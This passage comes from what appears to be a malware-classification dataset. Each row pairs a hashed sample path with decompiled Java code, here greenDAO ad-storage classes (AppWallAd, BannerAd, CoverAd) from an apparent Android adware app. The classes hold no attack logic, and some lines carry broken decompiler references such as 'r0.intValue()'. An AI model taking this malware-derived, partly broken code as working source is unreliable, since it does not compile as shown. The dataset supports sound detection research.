public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setIsRecommend(  Integer num){     this.isRecommend=num;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\AppWallAdDao.code","public class AppWallAdDao extends AbstractDao<AppWallAd,Long> {   public static final String TABLENAME=""APP_WALL_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property HasBoundAd=new Property(17,Integer.class,""hasBoundAd"",false,""HAS_BOUND_AD"");     public static final Property IsRecommend=new Property(18,Integer.class,""isRecommend"",false,""IS_RECOMMEND"");   }   public AppWallAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public AppWallAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'APP_WALL_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'HAS_BOUND_AD' INTEGER,'IS_RECOMMEND' INTEGER);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'APP_WALL_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  AppWallAd appWallAd){     sQLiteStatement.clearBindings();     Long id=appWallAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=appWallAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (appWallAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (appWallAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=appWallAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=appWallAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=appWallAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=appWallAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=appWallAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=appWallAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=appWallAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=appWallAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=appWallAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=appWallAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=appWallAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=appWallAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=appWallAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (appWallAd.getHasBoundAd() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (appWallAd.getIsRecommend() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }   }   @Override public Long getKey(  AppWallAd appWallAd){     if (appWallAd != null) {       return appWallAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public AppWallAd readEntity(  Cursor cursor,  int i){     return new AppWallAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));   }   @Override public void readEntity(  Cursor cursor,  AppWallAd appWallAd,  int i){     appWallAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     appWallAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     appWallAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     appWallAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     appWallAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     appWallAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     appWallAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     appWallAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     appWallAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     appWallAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     appWallAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     appWallAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     appWallAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     appWallAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     appWallAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     appWallAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     appWallAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     appWallAd.setHasBoundAd(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     appWallAd.setIsRecommend(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  AppWallAd appWallAd,  long j){     appWallAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\BannerAd.code","public class BannerAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private String bannerImg;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private Integer showStyle;   private Integer showTime;   private String url;   private String wifiSwitches;   public BannerAd(){   }   public BannerAd(  Long l){     this.id=l;   }   public BannerAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.showTime=num3;     this.showStyle=num4;     this.bannerImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public String getBannerImg(){     return this.bannerImg;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setBannerImg(  String str){     this.bannerImg=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\BannerAdDao.code","public class BannerAdDao extends AbstractDao<BannerAd,Long> {   public static final String TABLENAME=""BANNER_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");     public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");     public static final Property BannerImg=new Property(19,String.class,""bannerImg"",false,""BANNER_IMG"");   }   public BannerAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public BannerAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'BANNER_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'SHOW_TIME' INTEGER,'SHOW_STYLE' INTEGER,'BANNER_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'BANNER_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  BannerAd bannerAd){     sQLiteStatement.clearBindings();     Long id=bannerAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=bannerAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (bannerAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (bannerAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=bannerAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=bannerAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=bannerAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=bannerAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=bannerAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=bannerAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=bannerAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=bannerAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=bannerAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=bannerAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=bannerAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=bannerAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=bannerAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (bannerAd.getShowTime() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (bannerAd.getShowStyle() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }     String bannerImg=bannerAd.getBannerImg();     if (bannerImg != null) {       sQLiteStatement.bindString(20,bannerImg);     }   }   @Override public Long getKey(  BannerAd bannerAd){     if (bannerAd != null) {       return bannerAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public BannerAd readEntity(  Cursor cursor,  int i){     return new BannerAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)),cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public void readEntity(  Cursor cursor,  BannerAd bannerAd,  int i){     bannerAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     bannerAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     bannerAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     bannerAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     bannerAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     bannerAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     bannerAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     bannerAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     bannerAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     bannerAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     bannerAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     bannerAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     bannerAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     bannerAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     bannerAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     bannerAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     bannerAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     bannerAd.setShowTime(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     bannerAd.setShowStyle(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));     bannerAd.setBannerImg(cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  BannerAd bannerAd,  long j){     bannerAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CoverAd.code","public class CoverAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private Integer showStyle;   private Integer showTime;   private String tablePlaqueImg;   private String url;   private String wifiSwitches;   public CoverAd(){   }   public CoverAd(  Long l){     this.id=l;   }   public CoverAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.showTime=num3;     this.showStyle=num4;     this.tablePlaqueImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public String getTablePlaqueImg(){     return this.tablePlaqueImg;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setTablePlaqueImg(  String str){     this.tablePlaqueImg=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\CoverAdDao.code","public class CoverAdDao extends AbstractDao<CoverAd,Long> {   public static final String TABLENAME=""COVER_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");     public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");     public static final Property TablePlaqueImg=new Property(19,String.class,""tablePlaqueImg"",false,""TABLE_PLAQUE_IMG"");   }   public CoverAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public CoverAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'COVER_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'SHOW_TIME' INTEGER,'SHOW_STYLE' INTEGER,'TABLE_PLAQUE_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'COVER_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  CoverAd coverAd){     sQLiteStatement.clearBindings();     Long id=coverAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=coverAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (coverAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (coverAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=coverAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=coverAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=coverAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=coverAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=coverAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=coverAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=coverAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=coverAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=coverAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=coverAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=coverAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=coverAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=coverAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (coverAd.getShowTime() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (coverAd.getShowStyle() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }     String tablePlaqueImg=coverAd.getTablePlaqueImg();     if (tablePlaqueImg != null) {       sQLiteStatement.bindString(20,tablePlaqueImg);     }   }   @Override public Long getKey(  CoverAd coverAd){     if (coverAd != null) {       return coverAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public CoverAd readEntity(  Cursor cursor,  int i){     return new CoverAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 